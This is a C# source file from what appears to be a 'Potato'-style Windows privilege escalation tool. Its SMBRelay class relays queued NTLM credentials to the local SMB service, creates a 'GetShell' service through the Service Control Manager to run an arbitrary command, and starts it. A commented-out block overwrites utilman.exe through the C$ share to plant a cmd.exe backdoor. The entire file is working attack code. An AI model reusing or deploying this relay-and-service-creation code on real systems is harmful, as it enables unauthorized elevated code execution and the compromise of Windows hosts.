using System;
using System.Collections.Generic;
using SharpCifs;
using SharpCifs.Dcerpc;
using SharpCifs.Dcerpc.Msrpc;
using SharpCifs.Smb;

namespace Potato
{
    class SMBRelay
    {
        public bool doPsexec(String binPath, NtlmPasswordAuthentication auth, String cmd)
        {
            Random rnd = new Random();
            int randInt = rnd.Next(1,10000000);
            String host = "127.0.0.1";
            DcerpcHandle handle = DcerpcHandle.GetHandle("ncacn_np:" + host + "[\\pipe\\svcctl]", auth);
            // Open the SCManager on the remote machine and get a handle
            // for that open instance (scManagerHandle).
            Rpc.PolicyHandle scManagerHandle = new Rpc.PolicyHandle();
            svcctl.OpenSCManager openSCManagerRpc = new svcctl.OpenSCManager("\\\\" + host, null,
                (0x000F0000 | 0x0001 | 0x0002 | 0x0004 | 0x0008 | 0x0010 | 0x0020), scManagerHandle);
            handle.Sendrecv(openSCManagerRpc);
            if (openSCManagerRpc.retval != 0)
            {
                throw new SmbException(openSCManagerRpc.retval, true);
            }

            Rpc.PolicyHandle svcHandle = new Rpc.PolicyHandle();
            svcctl.OpenService openServiceRpc = new svcctl.OpenService(scManagerHandle,
                "GetShell"+randInt, svcctl.SC_MANAGER_ALL_ACCESS, svcHandle);
            handle.Sendrecv(openServiceRpc);

            // If the service didn't exist, create it.
            if (openServiceRpc.retval == 1060)
            {
                // Create a new service.
                svcHandle = new Rpc.PolicyHandle();
                //code 272 is for an interactive, own process service this was originally svcctl.SC_TYPE_SERVICE_WIN32_OWN_PROCESS
                svcctl.CreateServiceW createServiceWRpc = new svcctl.CreateServiceW(
                    scManagerHandle, "GetShell"+randInt, "GetShell"+randInt,
                    svcctl.SC_MANAGER_ALL_ACCESS, 272,
                    svcctl.SC_START_TYPE_SERVICE_DEMAND_START, svcctl.SC_SERVICE_ERROR_NORMAL,
                    cmd,
                    null, null, null, 0, null, null, 0, svcHandle);
                handle.Sendrecv(createServiceWRpc);
                if (createServiceWRpc.retval != 0)
                {
                    throw new SmbException(createServiceWRpc.retval, true);
                }
            }
            
            svcctl.StartService startServiceRpc = new svcctl.StartService(svcHandle, 0, new String[0]);
            handle.Sendrecv(startServiceRpc);
            return true;
        }
        public void startSMBRelay(Queue<byte[]> ntlmQueue,String cmd)
        {
            Config.setNtlmContextFactory(new Config.QueuedNtlmContextFactoryImpl());
            NtlmPasswordAuthentication auth = new NtlmPasswordAuthentication(".", "", "");
            auth.additionalData = ntlmQueue;
            Console.WriteLine("Starting SMB Relay...");
            /*
            SmbFile f = new SmbFile("smb://127.0.0.1/C$/Windows/System32/utilman.exe", auth);
            SmbFileOutputStream os = new SmbFileOutputStream(f);
            os.Write(System.Text.Encoding.Unicode.GetBytes("start cmd.exe /k \"whoami\""));
            os.Close();*/
            bool status;
            try
            {
                status = doPsexec("C:\\Windows\\System32\\cmd.exe", auth, cmd);
            }
            catch (SmbException ex)
            {
                Console.WriteLine(ex.Message);
                status = false;
            }
            if (status)
            {
                Console.WriteLine("Successfully started service");
                ntlmQueue.Enqueue(new byte[] { 99 });
                Config.signalHandlerClient.Set();
            }
            else
            {
                ntlmQueue.Enqueue(new byte[] { 00 });
                Console.WriteLine("Failed");
                Config.signalHandlerClient.Set();
            }
        }
    }
}